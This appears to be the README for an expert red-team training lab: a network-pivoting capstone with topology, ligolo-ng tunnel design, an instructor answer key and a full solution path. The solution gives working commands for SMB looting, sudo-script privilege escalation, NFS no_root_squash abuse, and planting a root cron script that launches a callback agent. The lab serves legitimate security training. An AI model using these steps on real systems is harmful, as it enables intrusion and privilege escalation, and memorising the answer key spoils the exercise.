# cr-18-n5b — Multi-Tier Network Pivoting (Capstone)

Offensive / red-team hands-on lab. A trainee starts in a DMZ and must chain
two application-layer pivots (via **ligolo-ng**) and two file-service
misconfigurations to reach a flag on a Management host that no external
system can touch.

**Status: fully tested end-to-end (A1→A7) on the platform, all five flags
confirmed retrievable.** Replaces two earlier, non-viable designs — see
*Design history* below.

- **Course code:** N5b
- **Type:** CR (Cyber Range)
- **Difficulty:** Expert
- **Duration:** 50 min
- **Audience:** Penetration Tester
- **Resources:** `N5b_Tools_and_Techniques_Manual.docx` — a tool/technique
  reference for trainees (generic syntax, no lab-specific IPs or answers).

---

## Topology

Three routed tiers, segmented by the router's firewall. Two hosts are
dual-homed and act as the only bridges between tiers — these are the pivots
the trainee must own.

| Host | Tier(s) | IP(s) | Role |
|------|---------|-------|------|
| `attacker` | DMZ | 10.10.10.10 | Trainee console (`pentester`/`pentester`); runs the ligolo-ng **proxy** |
| `dmzhost` | DMZ + Internal | 10.10.10.2 / 10.10.20.2 | SMB entry point; runs the first ligolo-ng **agent** |
| `appserver` | Internal | 10.10.20.20 | Mounts the NFS share; hosts the A5 pivot-proof flag |
| `nfsserver` | Internal + Management | 10.10.20.30 / 10.10.30.30 | Exports the misconfigured share; second ligolo-ng **agent** fires via cron |
| `mgmthost` | Management | 10.10.30.100 | Final target |
| `router` | all | .1 on each tier | Enforces segmentation |

```
attacker ── DMZ 10.10.10.0/24 ── dmzhost
 (ligolo proxy)                     │ dual-homed (ligolo agent #1)
                Internal 10.10.20.0/24
                  ├── appserver
                  └── nfsserver
                                    │ dual-homed (ligolo agent #2, via cron)
                Management 10.10.30.0/24
                  └── mgmthost
```

**Segmentation:** the router's FORWARD chain default-drops all inter-tier
traffic except Internal→Management. DMZ cannot reach Internal or Management
through the router at all — the attacker must pivot through `dmzhost` and
`nfsserver`. None of the actual attack traffic ever crosses the router
(each ligolo-ng agent originates its own connection within its own subnet).

`appserver`, `nfsserver`, and `mgmthost` are `hidden: true` — no console
access, reachable only over the network once pivoted to.

**Operational check before handing this to a trainee:** confirm all six
VMs are actually powered on. During testing, `appserver` being shut down
produced total, silent packet loss through an otherwise correctly-configured
pivot — indistinguishable at first glance from a broken tunnel. Worth a
quick `ping`/`curl` sanity pass against each internal host before a live
session.

---

## Pivot mechanism: ligolo-ng (not IP forwarding)

**This design was changed after live testing on the platform.** The original
plan used kernel `ip_forward` + iptables `MASQUERADE` on the dual-homed
hosts. Testing found it **fails silently**: when the target replies, the
un-NAT'd packet leaving the DMZ-facing interface carries a source address
(`10.10.20.20`, the Internal target) that the DMZ Neutron port never owns.
Platform anti-spoofing drops it — invisible from inside the guest (`tcpdump`
on the guest shows the packet "leaving" normally), so the first symptom is
just silent, total packet loss on the return leg.

**ligolo-ng avoids this by design.** It doesn't forward IP packets — the
agent, running on the pivot host, receives a request over its own encrypted
control connection back to the proxy and then **originates a normal local
connection** to the target using its own real interface and IP. From
Neutron's point of view this is indistinguishable from any other outbound
connection the host makes — there is never a packet on the wire with a
foreign source address.

**How the two hops work, as tested:**
- **Hop 1 (DMZ→Internal):** `dmzhost`'s agent connects back to `attacker`'s
  proxy — both on the DMZ subnet directly, no router involved. The trainee
  routes DMZ-tier traffic for `10.10.20.0/24` into the `ligolo` tun
  interface on `attacker`; the proxy relays it to the agent, which connects
  to the Internal target from its own Internal IP (`10.10.20.2`).
- **Hop 2 (Internal→Management):** rather than requiring a separate
  credential onto `nfsserver`, the second agent is triggered by a **root
  cron job on nfsserver that executes a script from the NFS-mounted
  share** (see *A7 mechanism* below). The trainee plants the agent-launch
  command as that script's contents; cron fires it as root within ~60s.

Both agent binaries and the proxy binary are **pre-staged by the playbook**
(`/opt/ligolo/agent` on `dmzhost`/`nfsserver`, `/opt/ligolo/proxy` on
`attacker`), pinned to **v0.9.1**.

**Caveat:** downloading the binaries during provisioning requires the target
VMs to reach `github.com`/`release-assets.githubusercontent.com` at
build time — same assumption `apt install` already relies on for these
hosts. `get_url` tasks are set to `failed_when: false` so a failure won't
abort the playbook, but the lab won't be solvable without the binaries —
check `/opt/ligolo/` exists on each host after deployment.

**tmux is required and pre-installed on `attacker`.** ligolo-ng needs the
proxy and each agent running simultaneously — multiple long-lived processes
from a single browser-based console. `tmux` (pre-installed via the
playbook) solves this with pane splitting; it needs no GUI and works fine
over Guacamole-style browser terminals. See the solution path below and the
Tools & Techniques manual for exact keybindings.

---

## A7 mechanism: cron-triggered second agent (NFS trust abuse, completed)

The `no_root_squash` export alone doesn't hand the trainee a shell on
`nfsserver` — it grants root-equivalent *file* access to the export's
contents from any client. Getting an actual foothold *on* `nfsserver`
requires a second element: something on `nfsserver` that executes content
from the share. That's provided by:

- A **root cron job** on `nfsserver`, firing every minute, running
  `/bin/bash /srv/share/.sync-check.sh`.
- A **placeholder script** at that path (root-owned, executable, currently a
  no-op) — inside the exported share, so any client root (via
  `no_root_squash`) can overwrite it.

**Solution:** the trainee overwrites `.sync-check.sh` with a command that
launches the ligolo-ng agent, connecting back to a `listener_add` the
trainee has already opened on `dmzhost`'s session. Within ~60 seconds,
cron executes it as root on `nfsserver`, and a new agent session appears on
the proxy console — no SSH or separate credential onto `nfsserver` needed.

**Known design gap — no in-lab discovery breadcrumb yet.** Nothing
currently signals to the trainee that `.sync-check.sh` specifically is
special versus any other file in the share. A real engagement would
surface this via suspicious permissions/ownership/timestamps on `ls -la`,
or a narrative clue (e.g. a note mentioning "automated sync checks run
against this share"). **Recommended before wide release:** add such a
breadcrumb, and build the A7 hint ladder around discovery
("something on this network touches the share periodically" → "root
automation reading from writable content is a classic NFS trust escalation"
→ full payload syntax as the highest-cost hint). See conversation history
for the full design discussion.

---

## Deployment

```bash
ansible-playbook -i <inventory> playbook.yml
```

Play order matters: `dmzhost` must provision before it's attacked, and
`router` segmentation should be in place before the lab is handed to a
trainee. No cross-host `hostvars` dependencies — each host is self-contained.

### Dependencies

- **`ansible.posix`** collection — required for the router's `sysctl` task:
  `ansible-galaxy collection install ansible.posix`
- **`community.general`** — not required.
- **`user-access` role** (`requirements.yml`) — provisions the `pentester`
  console login on `attacker`. This was missing in an earlier draft of the
  playbook; confirm it's present before deploying (`roles:` block in the
  `attacker` play).
- Outbound internet from `attacker`, `dmzhost`, `nfsserver` during
  provisioning (ligolo-ng download) — see caveat above.

---

## Answer key

> Instructor reference — do not distribute to trainees.

| Level | Flag | Where | How it's obtained |
|-------|------|-------|--------------------|
| A3 | `smb_flag` | `/srv/public/smb_flag.txt` on dmzhost | Enumerate SMB (445), read guest share |
| A4 | `dmz_root_flag` | `/root/dmz_root_flag.txt` on dmzhost, root-only | Escalate via writable `netcheck.sh` + NOPASSWD sudo |
| A5 | `pivot_flag` | HTTP `:8080` on appserver (Internal-only) | Confirms DMZ→Internal ligolo-ng pivot works |
| A6 | `nfs_flag` | `/srv/share/.nfs_flag` on nfsserver, root-only, inside the export | NFS `no_root_squash` trust abuse |
| A7 | `mgmt_flag` | HTTP `:8080` on mgmthost | Confirms Internal→Management pivot + final reach (via the cron-triggered agent) |

All five flags are **APG-generated per sandbox** (`variables.yml`) — no fixed
strings, so answers can't be shared between trainees. Static credentials:
`pentester`/`pentester` (attacker console), `dmzadmin` (key-based, key
leaked via SMB).

---

## Solution path (reference, as tested)

**A2 — Access**
```bash
# console/SSH into attacker as pentester / pentester
```

**A3 — DMZ foothold (SMB)**
```bash
nmap -p 445 10.10.10.2
smbclient -N -L //10.10.10.2/
smbclient -N //10.10.10.2/public
# get id_rsa, get README.txt, get smb_flag.txt
chmod 600 id_rsa
ssh -i id_rsa dmzadmin@10.10.10.2
```

**A4 — Local escalation on dmzhost**
```bash
sudo -l
# -> (root) NOPASSWD: /opt/netcheck/netcheck.sh
ls -la /opt/netcheck/netcheck.sh          # world-writable

echo -e '#!/bin/bash\nbash -i' > /opt/netcheck/netcheck.sh
sudo /opt/netcheck/netcheck.sh
whoami; id                                 # must show uid=0(root), NOT just euid=0
cat /root/dmz_root_flag.txt
```
> **Use `bash -i` inside the sudo'd script, not `chmod +s /bin/bash`.** The
> SUID-bit approach gives *effective*-root only (`euid=0`, real `uid` stays
> `dmzadmin`) — confirmed via `strace` that some tools (`nft`, at minimum)
> check `getuid()`/`geteuid()` and refuse to run on that mismatch. Running
> the shell from inside a script `sudo` already elevated gives genuine
> `uid=0` and avoided every downstream tooling issue in testing.

**A5 — Pivot DMZ → Internal (ligolo-ng, via tmux)**
```bash
# on attacker:
tmux new -s pivot
# Ctrl+b then %  to split

# Pane 1 — proxy (leave running):
cd /opt/ligolo
sudo ./proxy -laddr 0.0.0.0:11601 -selfcert

# Pane 2 — SSH to dmzhost, escalate, run agent (leave running, don't touch again):
ssh -i id_rsa dmzadmin@10.10.10.2
sudo /opt/netcheck/netcheck.sh
cd /opt/ligolo
./agent -connect 10.10.10.10:11601 -ignore-cert

# back on Pane 1, once "Agent joined" appears:
session                    # select the dmzhost agent
start                      # brings up the 'ligolo' tun interface

# Pane 3 (new):
sudo ip route add 10.10.20.0/24 dev ligolo
curl http://10.10.20.20:8080/            # -> pivot_flag
```
> Ping through the tunnel is unreliable/version-dependent for ligolo-ng —
> use `curl` (TCP) as the real verification, not `ping` (ICMP).

**A6 — NFS trust abuse (Internal)**
```bash
# separate session/pane to dmzhost (leave Pane 2's agent untouched):
ssh -i id_rsa dmzadmin@10.10.10.2
sudo /opt/netcheck/netcheck.sh
whoami; id

mkdir -p /mnt/nfs
mount -t nfs 10.10.20.30:/srv/share /mnt/nfs
ls -la /mnt/nfs
cat /mnt/nfs/.nfs_flag                     # -> nfs_flag
```
> Requires `nfs-common` on `dmzhost` (now included in the playbook — an
> earlier version omitted it, causing `mount: bad option` errors).
> Also: the export is restricted to `10.10.20.0/24`, so this **must** run
> from a host with an Internal-tier IP (dmzhost) — running it from
> `attacker` directly fails with `access denied by server` even through the
> tunnel, since NFS checks the client's real source IP.

Note: because the flag lives inside the export and the trainee is already
root on the mounting client, direct read works without the classic
plant-SUID-and-execute-on-another-host maneuver — see *Design notes* below.

**A7 — Pivot Internal → Management + final capture (cron-triggered agent)**
```bash
# back on Pane 1 (proxy console), add a listener for the second hop:
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601

# in the same dmzhost session used for A6 (share still mounted):
cat > /mnt/nfs/.sync-check.sh << 'EOF'
#!/bin/bash
/opt/ligolo/agent -connect 10.10.20.2:11601 -ignore-cert &
EOF
chmod 755 /mnt/nfs/.sync-check.sh

# wait up to ~60s, watching Pane 1 for a new "Agent joined"
session                    # select the new nfsserver session
start

# new pane:
sudo ip route add 10.10.30.0/24 dev ligolo
curl http://10.10.30.100:8080/             # -> mgmt_flag
```

---

## Design notes & caveats

- **Feasibility history (VLAN → routing → ligolo-ng):** this course was
  originally scoped around VLAN tagging/hopping (802.1Q, DTP switch-spoofing).
  A PoC confirmed the platform's Neutron fabric strips VLAN-tagged frames
  between VMs even on the same network — not achievable without OpenStack
  trunk ports/nested GNS3. Redesigned around routed subnets with
  IP-forwarding pivots; **that too was tested and found broken** (Neutron
  drops the un-NAT'd return traffic). The course now uses **ligolo-ng**,
  which structurally avoids the anti-spoofing problem — confirmed working
  end-to-end. See conversation history for both PoCs.

- **A4's escalation is intentionally narrow**, not general sudo. `dmzadmin`
  can run exactly one world-writable script as root
  (`/opt/netcheck/netcheck.sh`, NOPASSWD) — a second, genuine
  misconfiguration to find, separate from the leaked key.

- **The real-vs-effective-root lesson (A4) is load-bearing, not incidental.**
  It was discovered through live debugging (an `nft` command failing with
  exit code 111, traced via `strace` to a `getuid()`/`geteuid()` mismatch
  check) and directly blocked A5 until fixed. Worth calling out explicitly
  in the level's hints, not just the solution.

- **A6 flag placement simplifies the intended attack** — a trainee already
  root on a mounting client can read `nfs_flag` directly without the full
  plant-SUID-and-execute-on-another-host maneuver. Still demonstrates the
  trust relationship authentically.

- **A7's cron mechanism is the "complete" version of the no_root_squash
  technique** — write access as root via the export, PLUS something on the
  target host that executes it. This is more realistic than a hypothetical
  direct-SSH path, but see the *A7 mechanism* section above for the
  outstanding discovery-breadcrumb gap.

- **A4's ATT&CK technique is local, not network-based** (unlike every other
  step). Closest fit: **T1548.003 — Sudo and Sudo Caching**. Consider adding
  it to the course's ATT&CK list, or presenting A4 as a sub-step of A3.

- **Realism trade-off, flagged not fixed:** ligolo-ng binaries are
  pre-staged on every host rather than transferred in by the trainee using
  their own access. This was a deliberate simplification to keep focus on
  pivoting/trust mechanics rather than file-transfer tradecraft (parallel to
  N5a's pre-installed hydra/nmap). A more realistic middle ground — staging
  the tarball only on `attacker` and having the trainee `scp` it to
  `dmzhost` using the already-leaked key — is possible if you want that
  skill included; not implemented.

- **Port 8080 is reused** by both the A5 (`appserver`) and A7 (`mgmthost`)
  services — harmless, different hosts.

- **Powered-off VMs produce silent, hard-to-diagnose failures.** `appserver`
  being shut down during testing looked identical to a broken pivot (total
  packet loss) until traced via `ip neigh` (ARP `FAILED` for that one host
  specifically). Worth a basic liveness check across all hosts as part of
  any pre-session smoke test.

### Suggested MITRE ATT&CK mapping

**T1046** (service discovery, every tier) · **T1133** (SMB as an exposed
external-facing service) · **T1199** (SMB key leak + NFS trust abuse) ·
**T1572** (both ligolo-ng pivots) · **T1068** (root via NFS no_root_squash) ·
**T1548.003** (A4 local escalation — see caveat above).

---

## Timing

Expert, 50 min, based on the validated solve path above.

| Level | Estimated |
|---|---|
| A3 — DMZ foothold (SMB) | ~8 min |
| A4 — Local escalation | ~5 min |
| A5 — Pivot DMZ→Internal | ~10 min |
| A6 — NFS trust abuse | ~8 min |
| A7 — Pivot Internal→Management + capture | ~12–14 min (includes the ~60s cron wait and, for a first-time solver, time to discover the `.sync-check.sh` mechanism — see the discovery-gap note above) |

≈ 46–48 min total for an expert trainee working carefully through the
tunnel setup and NFS/cron mechanics. The floor is dominated by correctly
configuring the two pivots and waiting on cron, not recall.
